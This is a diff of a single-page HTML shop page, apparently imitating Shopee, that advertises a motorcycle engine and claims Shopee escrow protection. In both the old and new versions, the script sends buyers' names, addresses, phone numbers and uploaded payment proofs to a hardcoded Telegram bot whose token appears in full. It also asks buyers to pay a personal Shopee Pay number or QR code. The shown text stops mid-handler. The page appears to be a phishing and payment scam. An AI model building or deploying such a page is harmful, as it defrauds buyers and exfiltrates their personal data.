@@ -1,44 +1,552 @@
- <!DOCTYPE html> 
-<html lang="en"> 
-<head>  
-<meta charset="utf-8"/>  
-<meta content="width=device-width, initial-scale=1" name="viewport"/> 
-<title>   Product Page with QRIS and Shopee Pay Payment 
-</title> 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
-<!-- Font Awesome CSS -->  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/> 
-<!-- Inter Font -->  <style>   body {      font-family: 'Inter', sans-serif;    }  
-</style>
-</head> 
-<body class="bg-white text-black"> 
-<div class="max-w-md mx-auto min-h-screen flex flex-col pb-20" id="app">  
-<!-- Product Page -->   
-<div class="" id="product-page"> 
-<!-- Image Section -->   
-<div class="relative">  
-<img alt="Motorcycle engine part on a cardboard surface with tools and other parts in background" class="w-full object-cover" height="600" src="tirev2010.jpg" width="600"/>   
-<!-- Left arrow circle -->  
-<button aria-label="Previous image" class="absolute top-1/2 left-3 -translate-y-1/2 bg-gray-300 bg-opacity-50 rounded-full w-10 h-10 flex items-center justify-center text-white text-2xl">  
-<i class="fas fa-arrow-left text-gray-600">    
-</i>   
-</button>   
-<!-- Cart icon top right --> 
-<button aria-label="Cart with 10 items" class="absolute top-3 right-3 text-white text-2xl relative">     
-<i class="fas fa-shopping-cart">   
-</i>      <span class="absolute -top-1 -right-1 bg-red-600 text-white text-xs font-semibold rounded-full w-5 h-5 flex items-center justify-center">  
-10      
-</span>   
-</button>  
-</div> 
-<!-- Price and Voucher -->  
-<div class="px-4 pt-4">   
-<p class="text-2xl font-semibold text-[#D84315] leading-none flex items-center gap-1">   
-Rp      <span class="text-3xl font-extrabold"> 
-4.507.080   
-</span>   
-<span class="text-[#D84315] font-normal">    
-Dengan Voucher   
-</span>    
-</p>  
-<h1 class="mt-3 text-base font-normal leading-tight">   
-MESIN TIREV2010 FULLSET PENGAPIAN KARBU SIAP PAKAI     </h1>    </div>    <!-- Guarantee and Return -->    <div class="px-4 mt-4 border-t border-gray-200 pt-3">     <button aria-label="Garansi tiba 30 September" class="w-full flex items-center justify-between text-left text-gray-800">      <div class="flex items-center gap-2">       <i class="fas fa-truck text-[#3AB49B] text-lg">       </i>       <div>        <p class="font-semibold text-sm">         Garansi tiba: 30 September        </p>        <p class="text-xs text-gray-400 leading-tight">         Dapatkan Voucher s/d Rp10.000 jika pesanan terlambat.        </p>       </div>      </div>      <i class="fas fa-chevron-right text-gray-400">      </i>     </button>     <button aria-label="Bebas Pengembalian COD-Cek Dulu" class="w-full flex items-center justify-between text-left text-gray-800 mt-3">      <div class="flex items-center gap-2">       <i class="fas fa-shield-alt text-[#D84315] text-lg">       </i>       <p class="font-semibold text-sm">        Bebas Pengembalian • COD-Cek Dulu       </p>      </div>      <i class="fas fa-chevron-right text-gray-400">      </i>     </button>    </div>    <!-- Store Rating -->    <div class="px-4 mt-4 border-t border-gray-200 pt-3">     <div class="flex justify-between items-center">      <p class="text-lg font-extrabold flex items-center gap-1">       4.8       <i class="fas fa-star text-yellow-400">       </i>       <span class="font-semibold ml-1">        Penilaian Toko       </span>       <span class="text-gray-500 font-normal">        (332)       </span>      </p>      <button aria-label="Lihat Semua" class="text-gray-500 font-semibold flex items-center gap-1">       Lihat Semua       <i class="fas fa-chevron-right">       </i>      </button>     </div>     <div class="flex flex-wrap gap-2 mt-3">      <span class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600">       Produk original       <span class="text-gray-400">        (8)       </span>      </span>      <span class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600">       Mantap       <span class="text-gray-400">        (7)       </span>      </span>      <span class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600">       Kualitas baik       <span class="text-gray-400">        (10)       </span>      </span>      <span class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600">       Barang bagus       <span class="text-gray-400">        (15)       </span>      </span>      <span class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600">       Ok       <span class="text-gray-400">        (4)       </span>      </span>      <span class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600">       Berfungsi dengan baik       <span class="text-gray-400">        (3)       </span>      </span>     </div>    </div>    <!-- Bottom fixed bar -->    <div class="fixed bottom-0 left-0 w-full max-w-md mx-auto flex justify-center" style="height: 56px;">     <button aria-label="Cart" class="w-1/3 bg-[#1E8B7E] text-white flex items-center justify-center gap-2 text-lg" id="cartBtn">      <i class="fas fa-shopping-cart">      </i>     </button>     <button aria-label="Buy with voucher" class="w-2/3 bg-[#D84315] text-white flex flex-col items-center justify-center text-sm font-semibold leading-tight" id="buyVoucherBtn">      <span>       Beli Dengan Voucher      </span>      <span class="text-lg font-extrabold leading-none">       Rp4.507.080      </span>     </button>    </div>   </div>   <!-- Checkout Page -->   <div class="hidden flex flex-col px-6 py-8" id="checkout-page">    <h2 class="text-xl font-semibold mb-1 text-center">     Isi Data Penerima &amp; Pilih Pembayaran    </h2>    <p class="text-center text-sm text-gray-600 mb-6 px-4">     Saldo di tahan Shopee sampai pembeli setuju untuk pengiriman ke seller. Pemberitahuan lengkap akan dikirimkan di aplikasi setelah pembayaran selesai.    </p>    <form class="flex flex-col gap-4" id="checkoutForm" enctype="multipart/form-data">     <label class="flex flex-col text-sm font-medium text-gray-700">      Nama Penerima      <input autocomplete="name" class="mt-1 border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-[#D84315]" name="recipientName" required="" type="text"/>     </label>     <label class="flex flex-col text-sm font-medium text-gray-700">      Alamat      <textarea autocomplete="street-address" class="mt-1 border border-gray-300 rounded px-3 py-2 resize-none focus:outline-none focus:ring-2 focus:ring-[#D84315]" name="address" required="" rows="3"></textarea>     </label>     <label class="flex flex-col text-sm font-medium text-gray-700">      No HP Penerima      <input autocomplete="tel" class="mt-1 border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-[#D84315]" name="phone" pattern="[0-9+ ]+" placeholder="Contoh: +628123456789" required="" type="tel"/>     </label>     <div class="mt-4 border border-gray-300 rounded p-4">      <p class="text-sm font-semibold text-gray-700 mb-2">       Cek Dulu - Bayar setelah barang diterima      </p>      <fieldset>       <legend class="sr-only">        Pilihan Pembayaran       </legend>       <label class="flex items-center gap-2 mb-2 cursor-pointer">        <input checked="" name="paymentMethod" type="radio" value="shopeePay"/>        <span class="text-sm">         Bayar dengan Shopee Pay        </span>       </label>       <label class="flex items-center gap-2 cursor-pointer">        <input name="paymentMethod" type="radio" value="qris"/>        <span class="text-sm">         Bayar dengan QRIS        </span>       </label>      </fieldset>     </div>     <button class="mt-6 bg-[#D84315] text-white py-3 rounded font-semibold hover:bg-[#b73712] transition" type="submit">      Konfirmasi Pesanan     </button>     <button class="mt-2 text-center text-[#D84315] font-semibold hover:underline" id="backBtn" type="button">      Kembali ke Produk     </button>    </form>   </div>   <!-- QRIS Payment Page -->   <div class="hidden flex flex-col items-center px-6 py-8" id="qris-page">    <h2 class="text-xl font-semibold mb-6 text-center">     Scan QRIS untuk Pembayaran    </h2>    <img alt="QRIS code for payment via Shopee Pay or mobile banking" class="w-64 h-64 object-contain mb-6" height="256" src="" width="256"/>    <p class="text-center text-gray-700 mb-6 px-4">     Silakan scan kode QR di atas menggunakan aplikasi Shopee Pay atau mobile banking Anda untuk melakukan pembayaran.    </p>    <form id="qrisProofForm" class="w-full max-w-sm flex flex-col gap-4" enctype="multipart/form-data">     <label class="flex flex-col text-sm font-medium text-gray-700">      Upload Bukti Pembayaran      <input accept="image/*,.pdf" class="mt-1" name="paymentProof" required="" type="file"/>     </label>     <button class="bg-[#D84315] text-white py-3 rounded font-semibold hover:bg-[#b73712] transition" type="submit">      Kirim Bukti Pembayaran     </button>    </form>    <button class="mt-4 text-[#D84315] font-semibold hover:underline" id="backToCheckoutBtnQRIS" type="button">     Kembali ke Form Pembayaran    </button>   </div>   <!-- Shopee Pay Payment Page -->   <div class="hidden flex flex-col items-center px-6 py-8" id="shopeePay-page">    <h2 class="text-xl font-semibold mb-6 text-center">     Pembayaran Shopee Pay    </h2>    <p class="text-center text-gray-700 mb-4 px-4">     Silakan transfer ke nomor Shopee Pay berikut:    </p>    <div class="bg-gray-100 rounded p-4 mb-6 w-full max-w-sm text-center font-mono text-lg select-all">     0812-3456-7890    </div>    <form id="shopeePayProofForm" class="w-full max-w-sm flex flex-col gap-4" enctype="multipart/form-data">     <label class="flex flex-col text-sm font-medium text-gray-700">      Upload Bukti Pembayaran      <input accept="image/*,.pdf" class="mt-1" name="paymentProof" required="" type="file"/>     </label>     <button class="bg-[#D84315] text-white py-3 rounded font-semibold hover:bg-[#b73712] transition" type="submit">      Kirim Bukti Pembayaran     </button>    </form>    <button class="mt-4 text-[#D84315] font-semibold hover:underline" id="backToCheckoutBtnShopee" type="button">     Kembali ke Form Pembayaran    </button>   </div>   <!-- Payment Confirmation Page -->   <div class="hidden flex flex-col items-center px-6 py-8" id="confirmation-page">    <h2 class="text-xl font-semibold mb-6 text-center">     Pembayaran Berhasil Dikirim    </h2>    <p class="text-center text-gray-700 mb-6 px-4">     Silakan cek notifikasi di akun Anda pada aplikasi untuk status transaksi.    </p>    <button class="bg-[#D84315] text-white py-3 rounded w-full max-w-xs font-semibold hover:bg-[#b73712] transition" id="backToHomeBtn">     Kembali ke Halaman Produk    </button>   </div>  </div>  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>  <script>   const productPage = document.getElementById('product-page');   const checkoutPage = document.getElementById('checkout-page');   const qrisPage = document.getElementById('qris-page');   const shopeePayPage = document.getElementById('shopeePay-page');   const confirmationPage = document.getElementById('confirmation-page');   const cartBtn = document.getElementById('cartBtn');   const buyVoucherBtn = document.getElementById('buyVoucherBtn');   const backBtn = document.getElementById('backBtn');   const backToCheckoutBtnQRIS = document.getElementById('backToCheckoutBtnQRIS');   const backToCheckoutBtnShopee = document.getElementById('backToCheckoutBtnShopee');   const backToHomeBtn = document.getElementById('backToHomeBtn');   const checkoutForm = document.getElementById('checkoutForm');   const qrisProofForm = document.getElementById('qrisProofForm');   const shopeePayProofForm = document.getElementById('shopeePayProofForm');   const chatId = '5923031825'; // Replace with your Telegram chat ID   const botToken = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk'; // Replace with your bot token   async function sendToTelegram(message) {    try {     const response = await axios.post(      `https://api.telegram.org/bot${botToken}/sendMessage`,      {       chat_id: chatId,       text: message,      }     );     console.log('Message sent to Telegram:', response.data);    } catch (error) {     console.error('Error sending message to Telegram:', error);    }   }   async function sendPhotoToTelegram(photo) {     try {      const formData = new FormData();      formData.append('chat_id', chatId);      formData.append('photo', photo); // Append the file directly      const response = await axios.post(       `https://api.telegram.org/bot${botToken}/sendPhoto`,       formData,       {        headers: {         'Content-Type': 'multipart/form-data'        }       }      );      console.log('Photo sent to Telegram:', response.data);      alert('Bukti pembayaran berhasil dikirim. Terima kasih!');      showConfirmation();     } catch (error) {      console.error('Error sending photo to Telegram:', error);      alert('Gagal mengirim bukti pembayaran. Silakan coba lagi.');     }   }   function showProduct() {     productPage.classList.remove('hidden');     checkoutPage.classList.add('hidden');     qrisPage.classList.add('hidden');     shopeePayPage.classList.add('hidden');     confirmationPage.classList.add('hidden');     window.scrollTo(0, 0);   }   function showCheckout() {     productPage.classList.add('hidden');     checkoutPage.classList.remove('hidden');     qrisPage.classList.add('hidden');     shopeePayPage.classList.add('hidden');     confirmationPage.classList.add('hidden');     window.scrollTo(0, 0);   }   function showQRIS() {     productPage.classList.add('hidden');     checkoutPage.classList.add('hidden');     qrisPage.classList.remove('hidden');     shopeePayPage.classList.add('hidden');     confirmationPage.classList.add('hidden');     window.scrollTo(0, 0);   }   function showShopeePay() {     productPage.classList.add('hidden');     checkoutPage.classList.add('hidden');     qrisPage.classList.add('hidden');     shopeePayPage.classList.remove('hidden');     confirmationPage.classList.add('hidden');     window.scrollTo(0, 0);   }   function showConfirmation() {     productPage.classList.add('hidden');     checkoutPage.classList.add('hidden');     qrisPage.classList.add('hidden');     shopeePayPage.classList.add('hidden');     confirmationPage.classList.remove('hidden');     window.scrollTo(0, 0);   }   cartBtn.addEventListener('click', showCheckout);   buyVoucherBtn.addEventListener('click', showCheckout);   backBtn.addEventListener('click', showProduct);   backToCheckoutBtnQRIS.addEventListener('click', showCheckout);   backToCheckoutBtnShopee.addEventListener('click', showCheckout);   backToHomeBtn.addEventListener('click', showProduct);   checkoutForm.addEventListener('submit', (e) => {     e.preventDefault();     const formData = new FormData(checkoutForm);     const recipientName = formData.get('recipientName');     const address = formData.get('address');     const phone = formData.get('phone');     const paymentMethod = formData.get('paymentMethod');     let message = `Pesanan Baru:\nNama: ${recipientName}\nAlamat: ${address}\nNo. HP: ${phone}\nMetode Pembayaran: ${paymentMethod}`;     sendToTelegram(message);     const paymentMethod = formData.get('paymentMethod');     if (paymentMethod === 'qris') {       showQRIS();     } else if (paymentMethod === 'shopeePay') {       showShopeePay();     } else {       alert('Metode pembayaran tidak valid.');     }   });   qrisProofForm.addEventListener('submit', async (e) => {     e.preventDefault();     const proofFile = qrisProofForm.paymentProof.files[0];     if (!proofFile) {       alert('Silakan upload bukti pembayaran.');       return;     }     try {      await sendPhotoToTelegram(proofFile)      qrisProofForm.reset();      showConfirmation();     } catch (error) {      console.error('Error sending QRIS proof to Telegram:', error);      alert('Gagal mengirim bukti pembayaran QRIS. Silakan coba lagi.');     }   });   shopeePayProofForm.addEventListener('submit', async (e) => {     e.preventDefault();     const proofFile = shopeePayProofForm.paymentProof.files[0];     if (!proofFile) {       alert('Silakan upload bukti pembayaran.');       return;     }     try {      await sendPhotoToTelegram(proofFile)      shopeePayProofForm.reset();      showConfirmation();     } catch (error) {      console.error('Error sending ShopeePay proof to Telegram:', error);      alert('Gagal mengirim bukti pembayaran Shopee Pay. Silakan coba lagi.');     }   });  </script> </body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Product Page with Telegram Bot Integration</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white text-black">
+  <div
+    class="max-w-md mx-auto min-h-screen flex flex-col pb-20"
+    id="app"
+  >
+    <!-- Product Page -->
+    <div class="" id="product-page">
+      <!-- Image Section -->
+      <div class="relative">
+        <img
+          alt="Motorcycle engine part on a cardboard surface with tools and other parts in background"
+          class="w-full object-cover"
+          height="600"
+          src="https://storage.googleapis.com/a1aa/image/357c1603-65ea-41f4-eedf-e89672fb8de3.jpg"
+          width="600"
+        />
+        <!-- Left arrow circle -->
+        <button
+          aria-label="Previous image"
+          class="absolute top-1/2 left-3 -translate-y-1/2 bg-gray-300 bg-opacity-50 rounded-full w-10 h-10 flex items-center justify-center text-white text-2xl"
+        >
+          <i class="fas fa-arrow-left text-gray-600"></i>
+        </button>
+        <!-- Cart icon top right -->
+        <button
+          aria-label="Cart with 10 items"
+          class="absolute top-3 right-3 text-white text-2xl relative"
+        >
+          <i class="fas fa-shopping-cart"></i>
+          <span
+            class="absolute -top-1 -right-1 bg-red-600 text-white text-xs font-semibold rounded-full w-5 h-5 flex items-center justify-center"
+            >10</span
+          >
+        </button>
+      </div>
+      <!-- Price and Voucher -->
+      <div class="px-4 pt-4">
+        <p
+          class="text-2xl font-semibold text-[#D84315] leading-none flex items-center gap-1"
+        >
+          Rp
+          <span class="text-3xl font-extrabold">4.507.080</span>
+          <span class="text-[#D84315] font-normal">Dengan Voucher</span>
+        </p>
+        <h1 class="mt-3 text-base font-normal leading-tight">
+          MESIN TIREV2010 FULLSET PENGAPIAN KARBU SIAP PAKAI
+        </h1>
+      </div>
+      <!-- Guarantee and Return -->
+      <div class="px-4 mt-4 border-t border-gray-200 pt-3">
+        <button
+          aria-label="Garansi tiba 30 September"
+          class="w-full flex items-center justify-between text-left text-gray-800"
+        >
+          <div class="flex items-center gap-2">
+            <i class="fas fa-truck text-[#3AB49B] text-lg"></i>
+            <div>
+              <p class="font-semibold text-sm">Garansi tiba: 30 September</p>
+              <p class="text-xs text-gray-400 leading-tight">
+                Dapatkan Voucher s/d Rp10.000 jika pesanan terlambat.
+              </p>
+            </div>
+          </div>
+          <i class="fas fa-chevron-right text-gray-400"></i>
+        </button>
+        <button
+          aria-label="Bebas Pengembalian COD-Cek Dulu"
+          class="w-full flex items-center justify-between text-left text-gray-800 mt-3"
+        >
+          <div class="flex items-center gap-2">
+            <i class="fas fa-shield-alt text-[#D84315] text-lg"></i>
+            <p class="font-semibold text-sm">Bebas Pengembalian • COD-Cek Dulu</p>
+          </div>
+          <i class="fas fa-chevron-right text-gray-400"></i>
+        </button>
+      </div>
+      <!-- Store Rating -->
+      <div class="px-4 mt-4 border-t border-gray-200 pt-3">
+        <div class="flex justify-between items-center">
+          <p class="text-lg font-extrabold flex items-center gap-1">
+            4.8
+            <i class="fas fa-star text-yellow-400"></i>
+            <span class="font-semibold ml-1">Penilaian Toko</span>
+            <span class="text-gray-500 font-normal">(332)</span>
+          </p>
+          <button
+            aria-label="Lihat Semua"
+            class="text-gray-500 font-semibold flex items-center gap-1"
+          >
+            Lihat Semua <i class="fas fa-chevron-right"></i>
+          </button>
+        </div>
+        <div class="flex flex-wrap gap-2 mt-3">
+          <span
+            class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600"
+            >Produk original <span class="text-gray-400">(8)</span></span
+          >
+          <span
+            class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600"
+            >Mantap <span class="text-gray-400">(7)</span></span
+          >
+          <span
+            class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600"
+            >Kualitas baik <span class="text-gray-400">(10)</span></span
+          >
+          <span
+            class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600"
+            >Barang bagus <span class="text-gray-400">(15)</span></span
+          >
+          <span
+            class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600"
+            >Ok <span class="text-gray-400">(4)</span></span
+          >
+          <span
+            class="border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600"
+            >Berfungsi dengan baik <span class="text-gray-400">(3)</span></span
+          >
+        </div>
+      </div>
+      <!-- Bottom fixed bar -->
+      <div
+        class="fixed bottom-0 left-0 w-full max-w-md mx-auto flex justify-center"
+        style="height: 56px"
+      >
+        <button
+          aria-label="Cart"
+          class="w-1/3 bg-[#1E8B7E] text-white flex items-center justify-center gap-2 text-lg"
+          id="cartBtn"
+        >
+          <i class="fas fa-shopping-cart"></i>
+        </button>
+        <button
+          aria-label="Buy with voucher"
+          class="w-2/3 bg-[#D84315] text-white flex flex-col items-center justify-center text-sm font-semibold leading-tight"
+          id="buyVoucherBtn"
+        >
+          <span>Beli Dengan Voucher</span>
+          <span class="text-lg font-extrabold leading-none">Rp4.507.080</span>
+        </button>
+      </div>
+    </div>
+    <!-- Checkout Page -->
+    <div class="hidden flex flex-col px-6 py-8" id="checkout-page">
+      <h2 class="text-xl font-semibold mb-1 text-center">
+        Isi Data Penerima &amp; Pilih Pembayaran
+      </h2>
+      <p class="text-center text-sm text-gray-600 mb-6 px-4">
+        Saldo di tahan Shopee sampai pembeli setuju untuk pengiriman ke seller.
+        Pemberitahuan lengkap akan dikirimkan di aplikasi setelah pembayaran
+        selesai.
+      </p>
+      <form
+        class="flex flex-col gap-4"
+        id="checkoutForm"
+        enctype="multipart/form-data"
+      >
+        <label class="flex flex-col text-sm font-medium text-gray-700">
+          Nama Penerima
+          <input
+            autocomplete="name"
+            class="mt-1 border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-[#D84315]"
+            name="recipientName"
+            required
+            type="text"
+          />
+        </label>
+        <label class="flex flex-col text-sm font-medium text-gray-700">
+          Alamat
+          <textarea
+            autocomplete="street-address"
+            class="mt-1 border border-gray-300 rounded px-3 py-2 resize-none focus:outline-none focus:ring-2 focus:ring-[#D84315]"
+            name="address"
+            required
+            rows="3"
+          ></textarea>
+        </label>
+        <label class="flex flex-col text-sm font-medium text-gray-700">
+          No HP Penerima
+          <input
+            autocomplete="tel"
+            class="mt-1 border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-[#D84315]"
+            name="phone"
+            pattern="[0-9+ ]+"
+            placeholder="Contoh: +628123456789"
+            required
+            type="tel"
+          />
+        </label>
+        <div class="mt-4 border border-gray-300 rounded p-4">
+          <p class="text-sm font-semibold text-gray-700 mb-2">
+            Cek Dulu - Bayar setelah barang diterima
+          </p>
+          <fieldset>
+            <legend class="sr-only">Pilihan Pembayaran</legend>
+            <label
+              class="flex items-center gap-2 mb-2 cursor-pointer"
+              ><input
+                checked
+                name="paymentMethod"
+                type="radio"
+                value="shopeePay"
+              /><span class="text-sm">Bayar dengan Shopee Pay</span></label
+            >
+            <label class="flex items-center gap-2 cursor-pointer"
+              ><input name="paymentMethod" type="radio" value="qris" /><span
+                class="text-sm"
+                >Bayar dengan QRIS</span
+              ></label
+            >
+          </fieldset>
+        </div>
+        <button
+          class="mt-6 bg-[#D84315] text-white py-3 rounded font-semibold hover:bg-[#b73712] transition"
+          type="submit"
+        >
+          Konfirmasi Pesanan
+        </button>
+        <button
+          class="mt-2 text-center text-[#D84315] font-semibold hover:underline"
+          id="backBtn"
+          type="button"
+        >
+          Kembali ke Produk
+        </button>
+      </form>
+    </div>
+    <!-- QRIS Payment Page -->
+    <div
+      class="hidden flex flex-col items-center px-6 py-8"
+      id="qris-page"
+    >
+      <h2 class="text-xl font-semibold mb-6 text-center">
+        Scan QRIS untuk Pembayaran
+      </h2>
+      <img
+        alt="QRIS code for payment via Shopee Pay or mobile banking"
+        class="w-64 h-64 object-contain mb-6"
+        height="256"
+        src="https://storage.googleapis.com/a1aa/image/efc48736-575d-498f-bca4-c6f2cb0763de.jpg"
+        width="256"
+      />
+      <p class="text-center text-gray-700 mb-6 px-4">
+        Silakan scan kode QR di atas menggunakan aplikasi Shopee Pay atau
+        mobile banking Anda untuk melakukan pembayaran.
+      </p>
+      <form
+        id="qrisProofForm"
+        class="w-full max-w-sm flex flex-col gap-4"
+        enctype="multipart/form-data"
+      >
+        <label class="flex flex-col text-sm font-medium text-gray-700">
+          Upload Bukti Pembayaran
+          <input
+            accept="image/*,.pdf"
+            class="mt-1"
+            name="paymentProof"
+            required
+            type="file"
+          />
+        </label>
+        <button
+          class="bg-[#D84315] text-white py-3 rounded font-semibold hover:bg-[#b73712] transition"
+          type="submit"
+        >
+          Kirim Bukti Pembayaran
+        </button>
+      </form>
+      <button
+        class="mt-4 text-[#D84315] font-semibold hover:underline"
+        id="backToCheckoutBtnQRIS"
+        type="button"
+      >
+        Kembali ke Form Pembayaran
+      </button>
+    </div>
+    <!-- Shopee Pay Payment Page -->
+    <div
+      class="hidden flex flex-col items-center px-6 py-8"
+      id="shopeePay-page"
+    >
+      <h2 class="text-xl font-semibold mb-6 text-center">
+        Pembayaran Shopee Pay
+      </h2>
+      <p class="text-center text-gray-700 mb-4 px-4">
+        Silakan transfer ke nomor Shopee Pay berikut:
+      </p>
+      <div
+        class="bg-gray-100 rounded p-4 mb-6 w-full max-w-sm text-center font-mono text-lg select-all"
+      >
+        0812-3456-7890
+      </div>
+      <form
+        id="shopeePayProofForm"
+        class="w-full max-w-sm flex flex-col gap-4"
+        enctype="multipart/form-data"
+      >
+        <label class="flex flex-col text-sm font-medium text-gray-700">
+          Upload Bukti Pembayaran
+          <input
+            accept="image/*,.pdf"
+            class="mt-1"
+            name="paymentProof"
+            required
+            type="file"
+          />
+        </label>
+        <button
+          class="bg-[#D84315] text-white py-3 rounded font-semibold hover:bg-[#b73712] transition"
+          type="submit"
+        >
+          Kirim Bukti Pembayaran
+        </button>
+      </form>
+      <button
+        class="mt-4 text-[#D84315] font-semibold hover:underline"
+        id="backToCheckoutBtnShopee"
+        type="button"
+      >
+        Kembali ke Form Pembayaran
+      </button>
+    </div>
+    <!-- Payment Confirmation Page -->
+    <div
+      class="hidden flex flex-col items-center px-6 py-8"
+      id="confirmation-page"
+    >
+      <h2 class="text-xl font-semibold mb-6 text-center">
+        Pembayaran Berhasil Dikirim
+      </h2>
+      <p class="text-center text-gray-700 mb-6 px-4">
+        Silakan cek notifikasi di akun Anda pada aplikasi untuk status
+        transaksi.
+      </p>
+      <button
+        class="bg-[#D84315] text-white py-3 rounded w-full max-w-xs font-semibold hover:bg-[#b73712] transition"
+        id="backToHomeBtn"
+      >
+        Kembali ke Halaman Produk
+      </button>
+    </div>
+  </div>
+  <script>
+    const productPage = document.getElementById("product-page");
+    const checkoutPage = document.getElementById("checkout-page");
+    const qrisPage = document.getElementById("qris-page");
+    const shopeePayPage = document.getElementById("shopeePay-page");
+    const confirmationPage = document.getElementById("confirmation-page");
+
+    const cartBtn = document.getElementById("cartBtn");
+    const buyVoucherBtn = document.getElementById("buyVoucherBtn");
+    const backBtn = document.getElementById("backBtn");
+    const backToCheckoutBtnQRIS = document.getElementById(
+      "backToCheckoutBtnQRIS"
+    );
+    const backToCheckoutBtnShopee = document.getElementById(
+      "backToCheckoutBtnShopee"
+    );
+    const backToHomeBtn = document.getElementById("backToHomeBtn");
+
+    const checkoutForm = document.getElementById("checkoutForm");
+    const qrisProofForm = document.getElementById("qrisProofForm");
+    const shopeePayProofForm = document.getElementById("shopeePayProofForm");
+
+    // Telegram Bot info
+    const TELEGRAM_BOT_TOKEN = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
+    const TELEGRAM_CHAT_ID = "5923031825";
+
+    function showProduct() {
+      productPage.classList.remove("hidden");
+      checkoutPage.classList.add("hidden");
+      qrisPage.classList.add("hidden");
+      shopeePayPage.classList.add("hidden");
+      confirmationPage.classList.add("hidden");
+      window.scrollTo(0, 0);
+    }
+
+    function showCheckout() {
+      productPage.classList.add("hidden");
+      checkoutPage.classList.remove("hidden");
+      qrisPage.classList.add("hidden");
+      shopeePayPage.classList.add("hidden");
+      confirmationPage.classList.add("hidden");
+      window.scrollTo(0, 0);
+    }
+
+    function showQRIS() {
+      productPage.classList.add("hidden");
+      checkoutPage.classList.add("hidden");
+      qrisPage.classList.remove("hidden");
+      shopeePayPage.classList.add("hidden");
+      confirmationPage.classList.add("hidden");
+      window.scrollTo(0, 0);
+    }
+
+    function showShopeePay() {
+      productPage.classList.add("hidden");
+      checkoutPage.classList.add("hidden");
+      qrisPage.classList.add("hidden");
+      shopeePayPage.classList.remove("hidden");
+      confirmationPage.classList.add("hidden");
+      window.scrollTo(0, 0);
+    }
+
+    function showConfirmation() {
+      productPage.classList.add("hidden");
+      checkoutPage.classList.add("hidden");
+      qrisPage.classList.add("hidden");
+      shopeePayPage.classList.add("hidden");
+      confirmationPage.classList.remove("hidden");
+      window.scrollTo(0, 0);
+    }
+
+    cartBtn.addEventListener("click", showCheckout);
+    buyVoucherBtn.addEventListener("click", showCheckout);
+    backBtn.addEventListener("click", showProduct);
+    backToCheckoutBtnQRIS.addEventListener("click", showCheckout);
+    backToCheckoutBtnShopee.addEventListener("click", showCheckout);
+    backToHomeBtn.addEventListener("click", showProduct);
+
+    // Helper: send message to Telegram Bot API
+    async function sendTelegramMessage(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      };
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(payload),
+        });
+        return response.ok;
+      } catch (error) {
+        console.error("Telegram send error:", error);
+        return false;
+      }
+    }
+
+    // Helper: send file to Telegram Bot API
+    async function sendTelegramFile(file, caption) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("document", file);
+      if (caption) formData.append("caption", caption);
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          body: formData,
+        });
+        return response.ok;
+      } catch (error) {
+        console.error("Telegram file send error:", error);
+        return false;
+      }
+    }
+
+    checkoutForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const formData = new FormData(checkoutForm);
+      const recipientName = formData.get("recipientName");
+      const address = formData.get("address");
+      const phone = formData.get("phone");
+      const paymentMethod = formData.get("paymentMethod");
+
+      // Compose message
+      let paymentText =
+        paymentMethod === "shopeePay"
+          ? "Bayar dengan Shopee Pay"
+          : paymentMethod === "qris"
+          ? "Bayar dengan QRIS"
+          : "Metode pembayaran tidak diketahui";
+
+      const message = `<b>Pesanan Baru</b>\n\n<b>Nama Penerima:</b> ${recipientName}\n<b>Alamat:</b> ${address}\n<b>No HP:</b> ${phone}\n<b>Metode Pembayaran:</b> ${paymentText}`;
+
+      const sent = await sendTelegramMessage(message);
+      if (!sent) {
+        alert("Gagal mengirim data ke Telegram. Silakan coba lagi.");
+        return;
+      }
+
+      if (paymentMethod === "qris") {
+        showQRIS();
+      } else if (paymentMethod === "shopeePay") {
+        showShopeePay();
+      } else {
+        alert("Metode pembayaran tidak valid.");
+      }
+    });
+
+    qrisProofForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const proofFile = qrisProofForm.paymentProof.files[0];
+      if (!proofFile) {
+        alert("Silakan upload bukti pembayaran.");
+        return;
+      }
